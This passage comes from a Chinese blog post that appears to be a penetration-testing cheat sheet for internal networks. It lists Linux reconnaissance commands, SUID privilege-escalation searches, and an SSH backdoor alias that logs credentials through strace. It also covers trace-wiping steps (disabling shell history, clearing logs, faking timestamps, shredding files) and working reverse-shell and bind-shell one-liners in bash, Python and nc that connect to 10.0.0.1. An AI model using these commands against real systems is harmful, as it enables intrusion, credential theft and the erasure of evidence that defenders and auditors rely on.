<li><p>当前登录的用户 <code>users</code> <code>who -a</code> <code>/var/log/utmp</code></p>
</li>
<li><p>查询无密码用户 <code>grep &#39;x:0:&#39; /etc/passwd</code></p>
</li>
<li><p>目前登录的用户 <code>w</code></p>
</li>
<li><p>登入过的用户信息 <code>last</code> &#x2F; <code>/var/log/wtmp</code></p>
</li>
<li><p>显示系统中所有用户最近一次登录信息 <code>lastlog</code> &#x2F; <code>/var/log/lastlog</code></p>
</li>
<li><p>登录成功日志 <code>/var/log/secure</code></p>
</li>
<li><p>登录失败日志 <code>/var/log/faillog</code></p>
</li>
<li><p>查看特权用户 <code>grep :0 /etc/passwd</code></p>
</li>
<li><p>查看passwd最后修改时间 <code>ls -l /etc/passwd</code></p>
</li>
<li><p>查看是否存在空口令用户 <code>awk -F: &#39;length($2)==0 &#123;print $1&#125;&#39; /etc/shadow</code></p>
</li>
<li><p>查看远程登录的账号 <code>awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow</code></p>
</li>
<li><p>查看具有sudo权限的用户</p>
</li>
<li><p><code>cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</code></p>
</li>
</ul>
<h3 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息"></a>用户和权限信息</h3><ul>
<li>当前用户 <code>whoami</code></li>
<li>当前用户信息 <code>id</code></li>
<li>可以使用sudo提升到root的用户（root） <code>cat /etc/sudoers</code></li>
<li>列出目前用户可执行与无法执行的指令 <code>sudo -l</code></li>
</ul>
<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
<li>打印系统环境信息 <code>env</code></li>
<li>打印系统环境信息 <code>set</code></li>
<li>环境变量中的路径信息 <code>echo $PATH</code></li>
<li>打印历史命令 <code>history</code> &#x2F; <code>~/.bash_history</code></li>
<li>显示当前路径 <code>pwd</code></li>
<li>显示默认系统遍历 <code>cat /etc/profile</code></li>
<li>显示可用的shell <code>cat /etc/shells</code></li>
</ul>
<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><ul>
<li>查看进程信息 <code>ps aux</code></li>
<li>资源占有情况 <code>top -c</code></li>
<li>查看进程关联文件 <code>lsof -c $PID</code></li>
<li>完整命令行信息 <code>/proc/$PID/cmdline</code></li>
<li>进程的命令名 <code>/proc/$PID/comm</code></li>
<li>进程当前工作目录的符号链接 <code>/proc/$PID/cwd</code></li>
<li>运行程序的符号链接 <code>/proc/$PID/exe</code></li>
<li>进程的环境变量 <code>/proc/$PID/environ</code></li>
<li>进程打开文件的情况 <code>/proc/$PID/fd</code></li>
</ul>
<h3 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h3><ul>
<li>由inetd管理的服务列表 <code>cat /etc/inetd.conf</code></li>
<li>由xinetd管理的服务列表 <code>cat /etc/xinetd.conf</code></li>
<li>nfs服务器的配置 <code>cat /etc/exports</code></li>
<li>邮件信息 <code>/var/log/mailog</code></li>
<li>ssh配置 <code>sshd_config</code></li>
</ul>
<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><ul>
<li>显示指定用户的计划作业（root） <code>crontab -l -u %user%</code></li>
</ul>
<p><strong>计划任务</strong></p>
<ul>
<li><code>/var/spool/cron/*</code></li>
<li><code>/var/spool/anacron/*</code></li>
<li><code>/etc/crontab</code></li>
<li><code>/etc/anacrontab</code></li>
<li><code>/etc/cron.*</code></li>
<li><code>/etc/anacrontab</code></li>
</ul>
<p><strong>开机启动项</strong></p>
<ul>
<li><code>/etc/rc.d/init.d/</code></li>
</ul>
<h3 id="网络、路由和通信"><a href="#网络、路由和通信" class="headerlink" title="网络、路由和通信"></a>网络、路由和通信</h3><ul>
<li>列出网络接口信息 <code>/sbin/ifconfig -a</code> &#x2F; <code>ip addr show</code></li>
<li>列出网络接口信息 <code>cat /etc/network/interfaces</code></li>
<li>查看系统arp表 <code>arp -a</code></li>
<li>打印路由信息 <code>route</code> &#x2F; <code>ip ro show</code></li>
<li>查看dns配置信息 <code>cat /etc/resolv.conf</code></li>
<li>打印本地端口开放信息 <code>netstat -an</code></li>
<li>列出iptable的配置规则 <code>iptables -L</code></li>
<li>查看端口服务映射 <code>cat /etc/services</code></li>
<li>Hostname <code>hostname -f</code></li>
<li>查看进程端口情况 <code>netstat -anltp | grep $PID</code></li>
</ul>
<h3 id="已安装程序"><a href="#已安装程序" class="headerlink" title="已安装程序"></a>已安装程序</h3><ul>
<li><code>rpm -qa --last</code> Redhat</li>
<li><code>yum list | grep installed</code> CentOS</li>
<li><code>ls -l /etc/yum.repos.d/</code></li>
<li><code>dpkg -l</code> Debian</li>
<li><code>cat /etc/apt/sources.list</code> Debian APT</li>
<li><code>pkg_info</code> xBSD</li>
<li><code>pkginfo</code> Solaris</li>
<li><code>pacman -Q</code> Arch Linux</li>
<li><code>emerge</code> Gentoo</li>
</ul>
<h3 id="文件-1"><a href="#文件-1" class="headerlink" title="文件"></a>文件</h3><ul>
<li>最近五天的文件 <code>find / -ctime +1 -ctime -5</code></li>
<li>文件系统细节 <code>debugfs</code></li>
</ul>
<h3 id="公私钥信息"><a href="#公私钥信息" class="headerlink" title="公私钥信息"></a>公私钥信息</h3><ul>
<li><code>~/.ssh</code></li>
<li><code>/etc/ssh</code></li>
</ul>
<h3 id="日志-1"><a href="#日志-1" class="headerlink" title="日志"></a>日志</h3><ul>
<li><code>/var/log/boot.log</code></li>
<li><code>/var/log/cron</code></li>
<li><code>/var/log/faillog</code></li>
<li><code>/var/log/lastlog</code></li>
<li><code>/var/log/messages</code></li>
<li><code>/var/log/secure</code></li>
<li><code>/var/log/syslog</code></li>
<li><code>/var/log/syslog</code></li>
<li><code>/var/log/wtmp</code></li>
<li><code>/var/log/wtmp</code></li>
<li><code>/var/run/utmp</code></li>
</ul>
<h3 id="虚拟环境检测"><a href="#虚拟环境检测" class="headerlink" title="虚拟环境检测"></a>虚拟环境检测</h3><ul>
<li><code>lsmod | grep -i &quot;vboxsf\|vboxguest&quot;</code></li>
<li><code>lsmod | grep -i &quot;vmw_baloon\|vmxnet&quot;</code></li>
<li><code>lsmod | grep -i &quot;xen-vbd\|xen-vnif&quot;</code></li>
<li><code>lsmod | grep -i &quot;virtio_pci\|virtio_net&quot;</code></li>
<li><code>lsmod | grep -i &quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&quot;</code></li>
</ul>
<h3 id="容器内信息收集"><a href="#容器内信息收集" class="headerlink" title="容器内信息收集"></a>容器内信息收集</h3><ul>
<li><code>capsh --print</code></li>
<li><code>cat /proc/1/cgroup</code></li>
<li><code>env | grep KUBE</code></li>
<li><code>ls -l .dockerenv</code></li>
<li><code>ls -l /run/secrets/Kubernetes.io/</code></li>
<li><code>mount</code></li>
<li><code>ps aux</code></li>
</ul>
<h2 id="持久化-1"><a href="#持久化-1" class="headerlink" title="持久化"></a>持久化</h2><h3 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h3><ul>
<li>内核漏洞利用</li>
<li>攻击有root权限的服务</li>
<li>利用第三方服务提权</li>
</ul>
<p><strong>通过有SUID属性的可执行文件</strong></p>
<ul>
<li>查找可能提权的可执行文件</li>
<li><code>find / -perm +4000 -ls</code></li>
<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>
<li><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></li>
<li><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></li>
</ul>
<p><strong>利用可用的root权限</strong></p>
<ul>
<li><code>sudo -l</code></li>
</ul>
<h3 id="自启动-1"><a href="#自启动-1" class="headerlink" title="自启动"></a>自启动</h3><ul>
<li>&#x2F;etc&#x2F;init.d</li>
<li>&#x2F;etc&#x2F;rc.d&#x2F;rc.local</li>
<li>~&#x2F;.bashrc</li>
<li>~&#x2F;.zshrc</li>
</ul>
<h3 id="后门-1"><a href="#后门-1" class="headerlink" title="后门"></a>后门</h3><p><strong>ssh 后门</strong></p>
<ul>
<li><code>alias ssh=&#39;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#39;</code></li>
<li>后门账户</li>
</ul>
<p><strong>常见应用</strong></p>
<ul>
<li><p>ICMP</p>
</li>
<li><p>DNS</p>
</li>
<li><p>icmp后门</p>
</li>
<li><p>后门端口复用</p>
</li>
<li><p><code>.</code> 开头隐藏文件</p>
</li>
<li><p>rootkit</p>
</li>
</ul>
<h2 id="痕迹清理-1"><a href="#痕迹清理-1" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><h3 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h3><ul>
<li><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;</code></li>
<li><code>kill -9 $$</code> kill history</li>
<li><code>history -c</code></li>
<li>在 <code>HISTSIZE=0</code> 中设置 <code>HISTSIZE=0</code></li>
</ul>
<h3 id="清除-修改日志文件"><a href="#清除-修改日志文件" class="headerlink" title="清除&#x2F;修改日志文件"></a>清除&#x2F;修改日志文件</h3><ul>
<li><code>/var/log/btmp</code></li>
<li><code>/var/log/lastlog</code></li>
<li><code>/var/log/wtmp</code></li>
<li><code>/var/log/utmp</code></li>
<li><code>/var/log/secure</code></li>
<li><code>/var/log/message</code></li>
</ul>
<h3 id="登录痕迹"><a href="#登录痕迹" class="headerlink" title="登录痕迹"></a>登录痕迹</h3><ul>
<li><p>删除 <code>~/.ssh/known_hosts</code> 中记录</p>
</li>
<li><p>修改文件时间戳<code>touch –r</code></p>
</li>
<li><p>删除tmp目录临时文件</p>
</li>
</ul>
<h3 id="操作痕迹"><a href="#操作痕迹" class="headerlink" title="操作痕迹"></a>操作痕迹</h3><ul>
<li>vim 不记录历史命令 <code>:set history=0</code></li>
<li><ul>
<li>ssh 登录痕迹，无痕登录 <code>ssh -T user@host /bin/bash -i</code></li>
</ul>
</li>
</ul>
<h3 id="覆写文件"><a href="#覆写文件" class="headerlink" title="覆写文件"></a>覆写文件</h3><ul>
<li>shred</li>
<li>dd</li>
<li>wipe</li>
</ul>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul>
<li>攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征</li>
<li>即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录</li>
<li>留存的后门包含攻击者的信息</li>
<li>使用的代理或跳板可能会被反向入侵</li>
</ul>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li>在操作前检查是否有用户在线</li>
<li>删除文件使用磁盘覆写的功能删除</li>
<li>尽量和攻击前状态保持一致</li>
</ul>
<h2 id="综合技巧"><a href="#综合技巧" class="headerlink" title="综合技巧"></a>综合技巧</h2><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>windows</strong></p>
<ul>
<li>lcx</li>
<li>netsh</li>
</ul>
<p><strong>linux</strong></p>
<ul>
<li>portmap</li>
<li>iptables</li>
</ul>
<p><strong>socket代理</strong></p>
<ul>
<li>Win: xsocks</li>
<li>Linux: proxychains</li>
</ul>
<p><strong>基于http的转发与socket代理(低权限下的渗透)</strong></p>
<ul>
<li>端口转发: tunna</li>
<li>socks代理: reGeorg</li>
</ul>
<p><strong>ssh通道</strong></p>
<ul>
<li>端口转发</li>
<li>socks</li>
</ul>
<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>常规shell反弹：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1<br><br>python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;<br><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f<br></code></pre></td></tr></table></figure>

<p>突破防火墙的imcp_shell反弹</p>
<p>正向shell：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -e /bin/sh -lp 1234<br>nc.exe -e cmd.exe -lp 1234<br></code></pre></td></tr></table></figure>

<h3 id="内网文件传输"><a href="#内网文件传输" class="headerlink" title="内网文件传输"></a>内网文件传输</h3><p><strong>windows下文件传输</strong></p>
<ul>
<li>powershell</li>
<li>vbs脚本文件</li>
<li>bitsadmin</li>
<li>文件共享</li>
<li>使用telnet接收数据</li>
<li>hta</li>
</ul>
<p><strong>linux下文件传输</strong></p>
<ul>
<li>python</li>
<li>wget</li>
<li>tar + ssh</li>
<li>利用dns传输数据</li>
</ul>
<p><strong>文件编译</strong></p>
<ul>
<li>powershell将exe转为txt，再txt转为exe</li>
</ul>
<h3 id="远程连接-执行程序"><a href="#远程连接-执行程序" class="headerlink" title="远程连接 &amp;&amp; 执行程序"></a>远程连接 &amp;&amp; 执行程序</h3><ul>
<li>at&amp;schtasks</li>
<li>psexec</li>
<li>wmic</li>
<li>wmiexec.vbs</li>
<li>smbexec</li>
<li>powershell remoting</li>
<li>SC创建服务执行</li>
<li>schtasks</li>
<li>SMB+MOF || DLL Hijacks</li>
<li>PTH + compmgmt.msc</li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
      
        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="print-no-link">#信息收集</a>
      
        <a href="/tags/%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4/" class="print-no-link">#相关指令</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>不同环境下内网渗透的相关技巧</div>
      <div>http://example.com/2024/06/17/command1/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>ZERO</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年6月17日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/07/11/domain1/" title="红日靶场vulnstack7实战笔记">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">红日靶场vulnstack7实战笔记</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/15/zuoye/" title="记录一次简单的渗透测试的练习">
                        <span class="hidden-mobile">记录一次简单的渗透测试的练习</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
